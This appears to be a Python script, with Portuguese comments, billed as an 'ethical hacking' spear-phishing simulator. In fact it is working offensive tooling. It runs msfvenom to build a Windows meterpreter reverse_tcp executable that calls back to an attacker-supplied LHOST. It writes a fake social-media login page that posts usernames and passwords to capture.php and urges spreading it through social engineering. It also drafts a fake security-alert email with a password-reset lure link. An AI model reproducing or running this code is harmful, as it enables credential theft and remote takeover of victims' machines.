import os
import subprocess

# Função para exibir um banner
def display_banner():
    print("""
    ***************************************
    *                                     *
    *    Simulador de Spear Phishing      *
    *           Hacking Ético             *
    *            By: @biaphra             *
    ***************************************
    """)

# Função para exibir opções de ataque
def display_menu():
    print("Escolha um vetor de ataque:")
    print("1. Phishing em Redes Sociais")
    print("2. Phishing por Email")
    print("3. Sair")
    choice = input("Digite sua escolha (1-3): ")
    return choice

# Função para configurar o payload do Metasploit
def configure_payload():
    print("\n[+] Configurando o payload do Metasploit...")
    lhost = input("[*] Digite o LHOST (ex., seu IP): ")
    lport = input("[*] Digite o LPORT (ex., 4444): ")
    payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > phishing_payload.exe"
    subprocess.run(payload, shell=True)
    print("\n[+] Payload criado: phishing_payload.exe")

# Função para iniciar phishing em redes sociais
def social_media_phishing():
    print("\n[+] Phishing em Redes Sociais Selecionado")
    print("[*] Gerando uma página de login falsa para redes sociais...")
    # Simulando template HTML para login em rede social
    with open("fake_login.html", "w") as file:
        file.write("""
        <html>
        <head><title>Login</title></head>
        <body>
        <h2>Login em Rede Social</h2>
        <form action="capture.php" method="POST">
            Usuário: <input type="text" name="username"><br>
            Senha: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
        </body>
        </html>
        """)
    print("[+] Página de login falsa criada: fake_login.html")
    print("[*] Use engenharia social para compartilhar essa página.")

# Função para iniciar phishing por email
def email_phishing():
    print("\n[+] Phishing por Email Selecionado")
    print("[*] Criando um email de phishing...")
    sender = input("[*] Digite o endereço de email do remetente: ")
    recipient = input("[*] Digite o endereço de email do destinatário: ")
    subject = input("[*] Digite o assunto do email: ")
    print("\n[*] Enviando email de phishing...")
    email_content = f"""
    De: {sender}
    Para: {recipient}
    Assunto: {subject}
    
    Olá,

    Notamos atividade suspeita em sua conta. Por favor, redefina sua senha clicando no link abaixo:
    
    [ http://fake-link.com ]

    Atenciosamente,
    Equipe de Segurança
    """
    print("[*] Conteúdo do email:")
    print(email_content)

# Função principal
def main():
    display_banner()
    while True:
        choice = display_menu()
        if choice == '1':
            social_media_phishing()
        elif choice == '2':
            configure_payload()
            email_phishing()
        elif choice == '3':
            print("Saindo...")
            break
        else:
            print("Escolha inválida. Tente novamente.")

if __name__ == "__main__":
    main()
